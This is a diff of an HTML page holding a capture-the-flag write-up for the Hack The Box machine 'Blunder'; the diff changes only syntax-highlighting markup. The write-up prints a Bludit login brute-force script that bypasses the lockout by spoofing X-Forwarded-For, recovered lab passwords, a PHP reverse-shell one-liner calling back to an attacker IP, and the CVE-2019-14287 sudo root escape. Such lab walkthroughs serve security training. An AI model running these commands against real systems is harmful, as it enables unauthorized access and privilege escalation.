@@ -69,13 +69,13 @@
 &gt; http-title: Blunder | A blunder of interesting facts</p>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">ffuf</span> -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://10.10.10.191/FUZZ</span></code></pre></div>
 <p><img src="/img/htb_blunder/2.png" /></p>
 <p>We get a /admin that has the login for the <strong>“Bludit cms”</strong> We also get a /LICENSE. The file shows</p>
 <p><img src="/img/htb_blunder/1.png" /></p>
 <p>Fuzzing for file with .txt extensions, we get something interesting</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">ffuf</span> -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -x</span>
-<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="ex">.txt</span></span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://10.10.10.191/FUZZ <span class="at">-x</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.txt</span></span></code></pre></div>
 <p>We get a possible username <strong>fergus</strong></p>
 <blockquote>
 <p>User: fergus</p>
@@ -91,57 +91,57 @@
 <h2 id="bruteforce">Bruteforce</h2>
 <p>Got a brute force vulnerability <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">here</a></p>
 <p>Generate a custom wordlist using <strong>cewl</strong></p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">cewl</span> -w passwords.txt -d 9 -m 10 blunder.htb</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">cewl</span> <span class="at">-w</span> passwords.txt <span class="at">-d</span> 9 <span class="at">-m</span> 10 blunder.htb</span></code></pre></div>
 <p>We need to modify the found exploit script as per our needs. The modified script is:</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="co">#!/usr/bin/env python3</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="im">import</span> re</span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="im">import</span> requests</span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a></span>
-<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>host <span class="op">=</span> <span class="st">&#39;http://10.10.10.191&#39;</span></span>
-<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>login_url <span class="op">=</span> host <span class="op">+</span> <span class="st">&#39;/admin/login&#39;</span></span>
-<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a>username <span class="op">=</span> <span class="st">&#39;fergus&#39;</span></span>
-<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>wordlist <span class="op">=</span> []</span>
-<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a></span>
-<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="co"># Generate 50 incorrect passwords</span></span>
-<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;passwords.txt&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> f:</span>
-<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a>    <span class="cf">for</span> line <span class="kw">in</span> f.readlines():</span>
-<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a>        wordlist.append(<span class="bu">str</span>(line).strip(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))</span>
-<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a></span>
-<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="co"># Add the correct password to the end of the list</span></span>
-<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a><span class="co">#  wordlist.append(&#39;adminadmin&#39;)</span></span>
-<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a></span>
-<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a><span class="cf">for</span> password <span class="kw">in</span> wordlist:</span>
-<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a>    session <span class="op">=</span> requests.Session()</span>
-<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a>    login_page <span class="op">=</span> session.get(login_url)</span>
-<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a>    csrf_token <span class="op">=</span> re.search(<span class="st">&#39;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#39;</span>,</span>
-<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a>login_page.text).group(<span class="dv">1</span>)</span>
-<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a></span>
-<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&#39;[*] Trying: </span><span class="sc">{p}</span><span class="st">&#39;</span>.<span class="bu">format</span>(p <span class="op">=</span> password))</span>
-<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a></span>
-<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a>    headers <span class="op">=</span> {</span>
-<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a>        <span class="st">&#39;X-Forwarded-For&#39;</span>: password,</span>
-<span id="cb4-28"><a href="#cb4-28" aria-hidden="true"></a>        <span class="st">&#39;User-Agent&#39;</span>: <span class="st">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36</span></span>
-<span id="cb4-29"><a href="#cb4-29" aria-hidden="true"></a><span class="st">(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,</span>
-<span id="cb4-30"><a href="#cb4-30" aria-hidden="true"></a>        <span class="st">&#39;Referer&#39;</span>: login_url</span>
-<span id="cb4-31"><a href="#cb4-31" aria-hidden="true"></a>    }</span>
-<span id="cb4-32"><a href="#cb4-32" aria-hidden="true"></a></span>
-<span id="cb4-33"><a href="#cb4-33" aria-hidden="true"></a>    data <span class="op">=</span> {</span>
-<span id="cb4-34"><a href="#cb4-34" aria-hidden="true"></a>        <span class="st">&#39;tokenCSRF&#39;</span>: csrf_token,</span>
-<span id="cb4-35"><a href="#cb4-35" aria-hidden="true"></a>        <span class="st">&#39;username&#39;</span>: username,</span>
-<span id="cb4-36"><a href="#cb4-36" aria-hidden="true"></a>        <span class="st">&#39;password&#39;</span>: password,</span>
-<span id="cb4-37"><a href="#cb4-37" aria-hidden="true"></a>        <span class="st">&#39;save&#39;</span>: <span class="st">&#39;&#39;</span></span>
-<span id="cb4-38"><a href="#cb4-38" aria-hidden="true"></a>    }</span>
-<span id="cb4-39"><a href="#cb4-39" aria-hidden="true"></a></span>
-<span id="cb4-40"><a href="#cb4-40" aria-hidden="true"></a>    login_result <span class="op">=</span> session.post(login_url, headers <span class="op">=</span> headers, data <span class="op">=</span> data,</span>
-<span id="cb4-41"><a href="#cb4-41" aria-hidden="true"></a>allow_redirects <span class="op">=</span> <span class="va">False</span>)</span>
-<span id="cb4-42"><a href="#cb4-42" aria-hidden="true"></a></span>
-<span id="cb4-43"><a href="#cb4-43" aria-hidden="true"></a>    <span class="cf">if</span> <span class="st">&#39;location&#39;</span> <span class="kw">in</span> login_result.headers:</span>
-<span id="cb4-44"><a href="#cb4-44" aria-hidden="true"></a>        <span class="cf">if</span> <span class="st">&#39;/admin/dashboard&#39;</span> <span class="kw">in</span> login_result.headers[<span class="st">&#39;location&#39;</span>]:</span>
-<span id="cb4-45"><a href="#cb4-45" aria-hidden="true"></a>            <span class="bu">print</span>()</span>
-<span id="cb4-46"><a href="#cb4-46" aria-hidden="true"></a>            <span class="bu">print</span>(<span class="st">&#39;SUCCESS: Password found!&#39;</span>)</span>
-<span id="cb4-47"><a href="#cb4-47" aria-hidden="true"></a>            <span class="bu">print</span>(<span class="st">&#39;Use </span><span class="sc">{u}</span><span class="st">:</span><span class="sc">{p}</span><span class="st"> to login.&#39;</span>.<span class="bu">format</span>(u <span class="op">=</span> username, p <span class="op">=</span> password))</span>
-<span id="cb4-48"><a href="#cb4-48" aria-hidden="true"></a>            <span class="bu">print</span>()</span>
-<span id="cb4-49"><a href="#cb4-49" aria-hidden="true"></a>            <span class="cf">break</span></span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> re</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>host <span class="op">=</span> <span class="st">&#39;http://10.10.10.191&#39;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>login_url <span class="op">=</span> host <span class="op">+</span> <span class="st">&#39;/admin/login&#39;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>username <span class="op">=</span> <span class="st">&#39;fergus&#39;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>wordlist <span class="op">=</span> []</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Generate 50 incorrect passwords</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;passwords.txt&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> f:</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> line <span class="kw">in</span> f.readlines():</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>        wordlist.append(<span class="bu">str</span>(line).strip(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Add the correct password to the end of the list</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="co">#  wordlist.append(&#39;adminadmin&#39;)</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> password <span class="kw">in</span> wordlist:</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>    session <span class="op">=</span> requests.Session()</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>    login_page <span class="op">=</span> session.get(login_url)</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>    csrf_token <span class="op">=</span> re.search(<span class="st">&#39;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#39;</span>,</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>login_page.text).group(<span class="dv">1</span>)</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&#39;[*] Trying: </span><span class="sc">{p}</span><span class="st">&#39;</span>.<span class="bu">format</span>(p <span class="op">=</span> password))</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>    headers <span class="op">=</span> {</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;X-Forwarded-For&#39;</span>: password,</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;User-Agent&#39;</span>: <span class="st">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a><span class="st">(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;Referer&#39;</span>: login_url</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> {</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;tokenCSRF&#39;</span>: csrf_token,</span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;username&#39;</span>: username,</span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;password&#39;</span>: password,</span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;save&#39;</span>: <span class="st">&#39;&#39;</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>    login_result <span class="op">=</span> session.post(login_url, headers <span class="op">=</span> headers, data <span class="op">=</span> data,</span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>allow_redirects <span class="op">=</span> <span class="va">False</span>)</span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="st">&#39;location&#39;</span> <span class="kw">in</span> login_result.headers:</span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">&#39;/admin/dashboard&#39;</span> <span class="kw">in</span> login_result.headers[<span class="st">&#39;location&#39;</span>]:</span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>()</span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">&#39;SUCCESS: Password found!&#39;</span>)</span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">&#39;Use </span><span class="sc">{u}</span><span class="st">:</span><span class="sc">{p}</span><span class="st"> to login.&#39;</span>.<span class="bu">format</span>(u <span class="op">=</span> username, p <span class="op">=</span> password))</span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>()</span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span></code></pre></div>
 <p>PS: The user we need to brute the password for is <strong>fergus</strong>, not admin. Trying with admin, we failed and trying with fergus, we succeed.</p>
 <p>We run the script and get our required password.</p>
 <p><img src="/img/htb_blunder/5.png" /></p>
@@ -157,11 +157,11 @@ Password: RolandDeschain</p>
 <p><img src="/img/htb_blunder/6.png" /></p>
 <h2 id="www-data-shell">www-data shell</h2>
 <p>We try getting a proper reverse shell from the merterpreter shell</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">php</span> -r <span class="st">&#39;$sock=fsockopen(&quot;10.10.14.55&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-r</span> <span class="st">&#39;$sock=fsockopen(&quot;10.10.14.55&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div>
 <p>We get a reverse shell back. We stabilize our shell using python.</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">python3.7</span> -c <span class="st">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="fu">stty</span> raw -echo</span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="bu">fg</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3.7</span> <span class="at">-c</span> <span class="st">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="fu">stty</span> raw <span class="at">-echo</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="bu">fg</span></span></code></pre></div>
 <p><img src="/img/htb_blunder/7.png" /></p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="enumeration-1">Enumeration</h2>
@@ -187,12 +187,12 @@ Password: Password120</p>
 <p>Going over to the /home directory, we see that hugo is in fact a user. We also find another user shaun.</p>
 <h2 id="user-shell">User shell</h2>
 <p>We switch to user hugo using su and the password obtained and get the user shell.</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="fu">su</span> - hugo</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> <span class="at">-</span> hugo</span></code></pre></div>
 <p>Now we can read our required user.txt file</p>
 <h1 id="privilege-esccalation---root">Privilege Esccalation - Root</h1>
 <p>Looking for sudo permissions for our user using <code>sudo -l</code>, we find that the user hugo can exevute <code>/bin/bash</code> as all users except root (ALL:!root)</p>
 <p>We see that we can execute /bin/bash as any user other than root. This can be exploited using a popular sudo vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">CVE-2019-14287</a>. Following the exploit, we execute /bin/bash ash sudo and get a root shell</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="fu">sudo</span> -u#-1 /bin/bash</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u#-1</span> /bin/bash</span></code></pre></div>
 <p>Now we can read our required root.txt file from the /root directory.</p>
 </article>
 
